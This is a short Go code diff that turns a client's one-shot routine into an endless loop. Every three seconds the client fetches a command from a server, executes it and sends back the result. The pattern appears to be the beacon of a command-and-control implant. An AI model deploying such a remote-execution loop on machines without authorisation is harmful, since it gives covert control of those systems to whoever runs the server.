@@ -7,6 +7,7 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
+	"time"
 
 	"github.com/dobin/antnium/model"
 	"github.com/google/uuid"
@@ -26,11 +27,16 @@ func (s Client) Start() {
 	fmt.Println("Client")
 
 	s.sendPing()
-	command, err := s.getCommand()
-	if err == nil {
-		command.Execute()
-		s.sendCommand(command)
+	for {
+		fmt.Print(".")
+		command, err := s.getCommand()
+		if err == nil {
+			command.Execute()
+			s.sendCommand(command)
+		}
+		time.Sleep(3 * time.Second)
 	}
+
 }
 
 func (s Client) sendPing() {
